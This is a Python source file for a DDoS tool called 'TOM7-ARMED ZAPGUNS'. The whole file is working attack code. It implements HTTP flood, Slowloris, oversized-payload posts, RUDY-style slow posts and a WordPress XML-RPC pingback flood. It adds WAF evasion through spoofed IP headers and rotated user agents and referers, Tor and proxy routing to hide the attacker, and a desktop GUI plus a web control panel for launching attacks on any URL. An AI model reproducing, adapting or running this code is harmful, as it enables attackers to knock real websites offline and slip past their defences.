#!/usr/bin/env python3

#----------------------------------------------------------------------------------------------------------------------------------------------------------------------
#DEVELOPPED & WHERE CREATED BY TOM7 - GGNTM26X SECURITY TEAM
#TOM7-ARMED DDOS TOOLS
#TOM7-ARMED DDOS Tools is an advanced DDOS tools with HTTP Flood, Slowloris, Massives JSON Attack Requests & XML-RPC Flood.
#TOM7-ARMED DDOS Tools can be configured with Proxychains, Proxylist, TOR Network & User-Agent Rotations to manipulate requests address to Target Machines.
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# ------------------------Modules Setup------------------------
try:
    import requests
    import threading
    import urllib3
    import ssl
    import socks
    import socket
    import queue
    import http.client
    import concurrent.futures
    import random
    import logging
    import string
    import tkinter as tk
    import time
    import os
    import sys
    import rich
    import flask
    import itertools
    from concurrent.futures import ThreadPoolExecutor
    from urllib.parse import urlparse
    from tkinter import ttk, messagebox
    from flask import Flask, request, render_template, send_from_directory
    from colorama import Back, Style, Fore, init
    from itertools import cycle
except ModuleNotFoundError as e:
    print(f"Requires Modules {e} Not Installed. Please Run: pip3 install -r requirements.txt")
    exit(1)


# ------------------------Modules Initializations------------------------

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

#------------------------------------------------------------------------

# --- Utility Functions ---
spinner = cycle(['|', '/', '-', '\\'])


def cleargui():
    os.system('cls' if os.name == 'nt' else 'clear')


def dinamicsgui(startgui):
    cleargui()
    for i in range(50):
        print(f"\r {Fore.YELLOW} {startgui} ... {Fore.LIGHTGREEN_EX}[{Fore.CYAN} {next(spinner)} {Fore.LIGHTGREEN_EX}] {Fore.RESET}")
        time.sleep(0.03)
        cleargui()
    time.sleep(0.1)

#------------------------------------------------------------------------

XBANNER = """
                    .    ..  .............. . . ......... ......................
                    .    ..  .......... ... ..xxxxxxxxx.. ................ ... .
                        .       ...    ...xxxxxxxxxxxxxx...............  .. ..  
                                      ..xxxxxxxxxxxxxxxxxxx......  ....      .. 
                                      .x...xxxxxxxxxxxxxxxxx. ..     ..     .   
                                    .xx...xxxxxxxxxxxxxxxxxxxx                  
                                    .....xxxxxxxxxxxxxxxxxxxxx.                 
                                    .x....xxxx.....xxxxxxxx.xxxx                
                                    .....x..       ...xxxxxx...x.               
                                  .......             .xxxxx...x                
                                  x...    ............  ..xx.....               
                                  ....         ... ...     .xx....              
                                  ...      .    ...  . ...  .xx...              
                                ...    ........xxxx.......   .x...              
                                ..       .......xxxxxxxxxx.    .x...            
                                ..       .......xxxxxxxxx..     ....            
                                ..        .........xxxxx..       ...            
                                ..         .......xxxxx..        ...            
                                ...        .......xxxx.        ...              
                                  ...        ...xxxxx..        ...              
                    ..            .....       .......       .... ...            
                    !xxx.     .....    ...                ..............      .x
                    !!!!xx.........     ....           .... ..........xxx....x!:
                    xxxx............       ..        ...  .... ..........xxxxxx!
                    x..................    ...     ..... .. ................xxxx
                    ...................... ...  ................................
                    .................._____ ___  __  __ ____ ...................
                    .................|_   _/ _ \|  \/  |__  |...................
                    ...................| || (_) | |\/| | / /....................
                    ...................|_| \___/|_|  |_|/_/.....................
                    ....................ARMED V2 | ZAPGUNS......................
                    ............................................................
                                 ____  _   ___  ___ _   _ _  _ ___  
                                |_  / /_\ | _ \/ __| | | | \| / __| 
                                 / / / _ \|  _/ (_ | |_| | .` \__ \ 
                                /___/_/ \_\_|  \___|\___/|_|\_|___/ 
"""


# ------------------------Files Configurations------------------------


UA_FILE = "UA.txt"
PROXY_FILE = "Proxies.txt"
REFERER_FILE = "Referers.txt"

DEFAULT_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/15.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/117.0"
]

DEFAULT_PROXY = [
    "http://127.0.0.1:9050",
    "socks4://127.0.0.1:9050",
    "socks5://127.0.0.1:9050"
]

DEFAULT_REFERER = [
    "https://www.google.com",
    "https://www.bing.com",
    "https://duckduckgo.com",
    "https://search.yahoo.com",
    "https://www.baidu.com",
    "https://yandex.com",
    "https://www.startpage.com",
    "https://www.ecosia.org",
    "https://www.qwant.com",
    "https://search.brave.com",
    "https://www.mojeek.com",
    "https://searx.org",
    "https://www.dogpile.com",
    "https://www.webcrawler.com",
    "https://www.ixquick.com",
    "https://www.gigablast.com",
    "https://swisscows.com",
    "https://metager.org",
    "https://www.youtube.com",
    "https://www.google.com",
    "https://news.google.com",
    "https://scholar.google.com",
    "https://www.reddit.com",
    "https://twitter.com",
    "https://x.com",
    "https://github.com",
    "https://stackoverflow.com",
    "https://www.amazon.com",
    "https://web.archive.org",
    "https://search.crossref.org",
    "https://ahmia.fi",
    "https://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion",
    "https://brave.com"
]


def docloader(filename, proxy_list=False):
    try:
        loaded_items = []
        config_dir = os.path.dirname(os.path.abspath(__file__))
        config_path = os.path.join(config_dir, filename)
        if not os.path.exists(config_path):
            if filename == UA_FILE:
                print(f'Error {filename} Not Found. Now Using Default Configuration')
                return DEFAULT_UA
            elif filename == PROXY_FILE:
                print(f'Error {filename} Not Found. Now Using Default Configuration')
                return DEFAULT_PROXY
            elif filename == REFERER_FILE:
                print(f'Error {filename} Not Found. Now Using Default Configuration')
                return DEFAULT_REFERER
            return []

        with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                item = line.strip()
                if item and not item.startswith("#"):
                    if proxy_list:
                        if "://" in item:
                            loaded_items.append(item)
                    else:
                        loaded_items.append(item)

        if not loaded_items:
            if filename == UA_FILE:
                print(f'Error {filename} Is Not Configuration Files / Malformed. Now Using Default Configuration')
                return DEFAULT_UA
            elif filename == PROXY_FILE:
                print(f'Error {filename} Is Not Configuration Files / Malformed. Now Using Default Configuration')
                return DEFAULT_PROXY
            elif filename == REFERER_FILE:
                print(f'Error {filename} Is Not Configuration Files / Malformed. Now Using Default Configuration')
                return DEFAULT_REFERER
        return loaded_items

    except Exception as e:
        print(f'[ERR] Failed To Load {filename}: {e}')
        if filename in [UA_FILE, PROXY_FILE, REFERER_FILE]:
            if filename == UA_FILE:
                print(f'Error {filename} Error Status ---> {e}')
                return DEFAULT_UA
            elif filename == PROXY_FILE:
                print(f'Error {filename} Error Status ---> {e}')
                return DEFAULT_PROXY
            elif filename == REFERER_FILE:
                print(f'Error {filename} Error Status ---> {e}')
                return DEFAULT_REFERER
        return []




user_agents = docloader(UA_FILE)
proxies = docloader(PROXY_FILE, proxy_list=True)
treferers = docloader(REFERER_FILE)

thread_num = 0
thread_lock = threading.Lock()

# --------------------------------------------------------------------

# ------------------------TOR Proxies Setup------------------------

def setup_tor():
    socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
    socket.socket = socks.socket
    cleargui()
    logging.info(f"\r{Fore.LIGHTCYAN_EX} {next(spinner)} TOR Proxies ENABLED.")

# ------------------------------------------------------------------

def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

# ------------------------WAF Evasion Setup------------------------

def evade_waf():
    evasion_techniques = [
        lambda: {"Connection": "keep-alive", "Accept-Encoding": "gzip, deflate, br", "Accept": "text/html,application/xhtml+xml"},
        lambda: {"X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"},
        lambda: {"Referer": random.choice(treferers) + f"; {''.join(random.choices(string.ascii_letters, k=5))}"},
        lambda: {"Accept-Language": random.choice(["en-US,en;q=0.9", "fr-FR,fr;q=0.8", "de-DE,de;q=0.7", "es-ES,es;q=0.6"])},
        lambda: {"Cache-Control": random.choice(["no-cache", "max-age=0"])},
        lambda: {"User-Agent": random.choice(user_agents) + f"; {''.join(random.choices(string.ascii_letters, k=5))}"},
        lambda: {"Via": f"1.1 {''.join(random.choices(string.ascii_lowercase, k=10))}.proxy"},
        lambda: {"DNT": "1"},
        lambda: {"X-Requested-With": "XMLHttpRequest"},
        lambda: {"CF-Connecting-IP": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"}
    ]
    return {k: v for d in random.sample(evasion_techniques, k=random.randint(2, 5)) for k, v in d().items()}

# -----------------------------------------------------------------

# ------------------------GLOBAL ATTACK METHODS CONFIGURATIONS------------------------
# ------------------------HTTP Flood | Slowloris | Massives JSON Payloads | XML-RPC Flood------------------------

class AttackMethods:
    @staticmethod

    def http_flood(target, duration, threads, proxy=None, use_tor=False):
        end_time = time.time() + duration
        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80
        ipaddr = socket.gethostname

        def attack():
            while time.time() < end_time:
                try:
                    if use_tor:
                        setup_tor()
                    session = requests.Session()
                    if proxy:
                        session.proxies = {"https": proxy}
                    headers = {"User-Agent": random.choice(user_agents)}
                    headers.update(evade_waf())
                    session.headers.update(headers)
                    session.get(target + f"?{''.join(random.choices(string.ascii_lowercase, k=10))}", timeout=3, verify=False)
                    logging.info(f"\r{Fore.RED}[{Fore.CYAN} {next(spinner)} {Fore.RED}] {Fore.MAGENTA} HTTP Flood Attack Sent To TARGET: {Fore.GREEN} {target} {Fore.MAGENTA} PORT: {Fore.GREEN} {port} {Fore.MAGENTA} TARGET IP ADDRESS: {Fore.GREEN} {ipaddr} {Fore.RESET}")
                except Exception as e:
                    logging.debug(f"HTTP Flood Error: {e}")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(attack)

    @staticmethod

    def slowloris(target, duration, sockets=500):
        end_time = time.time() + duration
        sockets_list = []
        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80
        ipaddr = socket.gethostname
        url_path = generate_url_path()

        def create_socket():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                if port == 443:
                    context = ssl.create_default_context()
                    s = context.wrap_socket(s, server_hostname=host)
                s.connect((host, port))
                s.send(f"GET /{url_path} HTTP/1.1\nHost: {host}\n\nUser-Agents: {random.choice(user_agents)}\n\n".encode())
                s.send(evade_waf().items().__str__().encode())
                logging.info(f"\r{Fore.RED}[{Fore.CYAN} {next(spinner)} {Fore.RED}] {Fore.MAGENTA} Slowloris Attack Sent To TARGET: {Fore.GREEN} {target} {Fore.MAGENTA} PORT: {Fore.GREEN} {port} {Fore.MAGENTA} TARGET IP ADDRESS: {Fore.GREEN} {ipaddr} {Fore.RESET}")
                return s
            except Exception as e:
                print(f"{Fore.YELLOW} No Connection, Server Maybe Down: {Fore.RED} {str(e)}")
                s.shutdown(socket.SHUT_RDWR)
                s.close()
            
        for _ in range(sockets):
            sock = create_socket()
            if sock:
                sockets_list.append(sock)
        while time.time() < end_time:
            for s in sockets_list[:]:
                try:
                    s.send(f"X-a: {random.randint(1, 10000)}\r\n".encode())
                except Exception:
                    sockets_list.remove(s)
                    new_sock = create_socket()
                    if new_sock:
                        sockets_list.append(new_sock)
            time.sleep(10)
    
    @staticmethod

    def massive_payload(target, duration, threads, proxy=None):
        end_time = time.time() + duration
        payload = ''.join(random.choices(string.ascii_letters + string.digits, k=5000000))  # 5MB payload
        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80
        ipaddr = socket.gethostname

        def attack():
            while time.time() < end_time:
                try:
                    session = requests.Session()
                    if proxy:
                        session.proxies = {"http": proxy, "https": proxy}
                    headers = {"User-Agent": random.choice(user_agents), "Content-Type": "application/octet-stream"}
                    headers.update(evade_waf())
                    session.headers.update(headers)
                    session.post(target, data=payload, timeout=5, verify=False)
                    logging.info(f"\r{Fore.RED}[{Fore.CYAN} {next(spinner)} {Fore.RED}] {Fore.MAGENTA} JSON Payloads Attack Sent To TARGET: {Fore.GREEN} {target} {Fore.MAGENTA} PORT: {Fore.GREEN} {port} {Fore.MAGENTA} TARGET IP ADDRESS: {Fore.GREEN} {ipaddr} {Fore.RESET}")
                except Exception as e:
                    logging.debug(f"Massives Payloads Error: {e}")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(attack)
    
    @staticmethod
    
    def rudy(target, duration, threads, proxy=None):
        end_time = time.time() + duration
        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80
        ipaddr = socket.gethostname

        def attack():
            while time.time() < end_time:
                try:
                    conn = http.client.HTTPConnection(host, port, timeout=5) if port == 80 else http.client.HTTPSConnection(host, port, timeout=5)
                    headers = {"User-Agent": random.choice(user_agents), "Content-Type": "application/x-www-form-urlencoded"}
                    headers.update(evade_waf())
                    conn.request("POST", "/", body="A" * 100, headers=headers)
                    time.sleep(random.uniform(0.1, 0.5))
                    conn.close()
                    logging.info(f"\r{Fore.RED}[{Fore.CYAN} {next(spinner)} {Fore.RED}] {Fore.MAGENTA} ARE YOU DEAD YET Attack Sent To TARGET: {Fore.GREEN} {target} {Fore.MAGENTA} PORT: {Fore.GREEN} {port} {Fore.MAGENTA} TARGET IP ADDRESS: {Fore.GREEN} {ipaddr} {Fore.RESET}")
                except Exception as e:
                    logging.debug(f"TOM7 MISSILES error: {e}")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(attack)

    @staticmethod

    def xmlrpc_flood(target, duration, threads, proxy=None):
        end_time = time.time() + duration
        xml_payloads = """<?xml version="1.0"?>
        <methodCall>
            <methodName>system.multicall</methodName>
            <params>
                <param><value><array><data>{}</data></array></value></param>
            </params>
        </methodCall>
        """.format("".join(['<value><string>pingback.ping</string></value>'* 1000]))
        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80
        ipaddr = socket.gethostname

        def attack():
            while time.time() < end_time:
                try:
                    session = requests.Session()
                    if proxy:
                        session.proxies = {"http": proxy, "https": proxy}
                    headers = {"User-Agent": random.choice(user_agents), "Content-Type": "text/xml"}
                    headers.update(evade_waf())
                    session.headers.update(headers)
                    session.post(target +"/xmlrpc.php", data=xml_payloads, timeout=5, verify=False)
                    logging.info(f"\r{Fore.RED}[{Fore.CYAN} {next(spinner)} {Fore.RED}] {Fore.MAGENTA} XML-RPC Attack Sent To TARGET: {Fore.GREEN} {target} {Fore.MAGENTA} PORT: {Fore.GREEN} {port} {Fore.MAGENTA} TARGET IP ADDRESS: {Fore.GREEN} {ipaddr} {Fore.RESET}")
                except Exception as e:
                    logging.debug(f"XML-RPC Error: {e}")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(attack)

# -----------------------------------------------------------------

# ------------------------GLOBAL GUI DISPLAY CONFIGURATIONS------------------------
# ------------------------TKINTER WINDOWS | WEB CONTROLS PANEL------------------------

class TOM7ARMEDGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("TOM7 ARMED | ZAP GUNS")
        self.target_var = tk.StringVar()
        self.duration_var = tk.StringVar(value="")
        self.threads_var = tk.StringVar(value="")
        self.method_var = tk.StringVar(value="Attack Methods")
        self.tor_var = tk.BooleanVar()

        ttk.Label(root, text="Target URL:").grid(row=0, column=0, padx=8, pady=8)
        ttk.Entry(root, textvariable=self.target_var).grid(row=0, column=1, padx=8, pady=8)
        ttk.Label(root, text="Duration (s):").grid(row=1, column=0, padx=8, pady=8)
        ttk.Entry(root, textvariable=self.duration_var).grid(row=1, column=1, padx=8, pady=8)
        ttk.Label(root, text="Threads:").grid(row=2, column=0, padx=8, pady=8)
        ttk.Entry(root, textvariable=self.threads_var).grid(row=2, column=1, padx=8, pady=8)
        ttk.Label(root, text="Method:").grid(row=3, column=0, padx=8, pady=8)
        ttk.Combobox(root, textvariable=self.method_var, values=[
            "HTTP Flood",
            "Slowloris",
            "Massive JSON Payloads",
            "RUDY",
            "XML-RPC Flood"
            ]).grid(row=3, column=1, padx=8, pady=8)
        ttk.Checkbutton(root, text="TOR Proxies", variable=self.tor_var).grid(row=4, column=0, columnspan=5, pady=8)
        ttk.Button(root, text="Start Attack", command=self.start_attack).grid(row=5, column=0, columnspan=5, pady=15)


    def start_attack(self):
        target = self.target_var.get()
        duration = int(self.duration_var.get())
        threads = int(self.threads_var.get())
        method = self.method_var.get()
        use_tor = self.tor_var.get()
        proxy = random.choice(proxies) if proxies else None

        if not target.startswith("http"):
            messagebox.showerror("Error","Invalid URL! Must start with http:// or https://")
            return

        if method =="HTTP Flood":
            AttackMethods.http_flood(target, duration, threads, proxy, use_tor)
        elif method =="Slowloris":
            AttackMethods.slowloris(target, duration)
        elif method =="Massive JSON Payloads":
            AttackMethods.massive_payload(target, duration, threads, proxy)
        elif method =="RUDY":
            AttackMethods.rudy(target, duration, threads, proxy)
        elif method =="XML-RPC Flood":
            AttackMethods.xmlrpc_flood(target, duration, threads, proxy)

        messagebox.showinfo("Started", f"Attack Launched To {target} Using {method} Methods")



# Use os.path.join for platform-independent paths
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATES_FOLDER = os.path.join(BASE_DIR, 'TM7CONFIG')


# Configure Flask application with custom template folder
app = Flask(__name__, template_folder=TEMPLATES_FOLDER)

@app.route("/")
def home():
    return render_template("TOM7ARMEDZAPGUNS.html")

@app.route('/<path:filename>')
def serve_tom7_files(filename):
    return send_from_directory(TEMPLATES_FOLDER, filename)


@app.route('/attack', methods=['POST'])
def attack():
    target = request.form['target']
    duration = int(request.form['duration'])
    threads = int(request.form['threads'])
    method = request.form['method']
    use_tor = 'tor' in request.form
    proxy = random.choice(proxies) if proxies else None

    if method =="HTTP Flood":
        AttackMethods.http_flood(target, duration, threads, proxy, use_tor)
    elif method =="Slowloris":
        AttackMethods.slowloris(target, duration)
    elif method =="Massive JSON Payloads":
        AttackMethods.massive_payload(target, duration, threads, proxy)
    elif method =="RUDY":
        AttackMethods.rudy(target, duration, threads, proxy)
    elif method =="XML-RPC Flood":
        AttackMethods.xmlrpc_flood(target, duration, threads, proxy)

    return f"Attack Launched To {target} Using {method} Methods."

# -----------------------------------------------------------------


# ------------------------MAIN ROOT------------------------


if __name__ == "__main__":
    cleargui()
    dinamicsgui(f"Loading User Agents")
    dinamicsgui(f"Loading Proxies")
    dinamicsgui(f"Loading Referers")
    time.sleep(1)
    cleargui()
    print(f"{Fore.RED}{XBANNER}{Fore.RESET}")
    FILE_LOADED = f"""
    

        {Back.BLACK}{Fore.YELLOW}[{Fore.RED} S {Fore.YELLOW}] {Fore.GREEN} USER AGENTS: {Fore.CYAN} {len(user_agents)} {Back.RESET}
        
        {Back.BLACK}{Fore.YELLOW}[{Fore.RED} S {Fore.YELLOW}] {Fore.GREEN} PROXIES: {Fore.CYAN} {len(proxies)} {Back.RESET}

        {Back.BLACK}{Fore.YELLOW}[{Fore.RED} S {Fore.YELLOW}] {Fore.GREEN} REFERERS: {Fore.CYAN} {len(treferers)} {Back.RESET}
    """
    print(f"{FILE_LOADED}")

    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=5000), daemon=True).start()
    root = tk.Tk()
    gui = TOM7ARMEDGUI(root)
    root.mainloop()
    cleargui()
    print(f"{Fore.LIGHTCYAN_EX}{XBANNER}{Fore.RESET}")

# -----------------------------------------------------------------
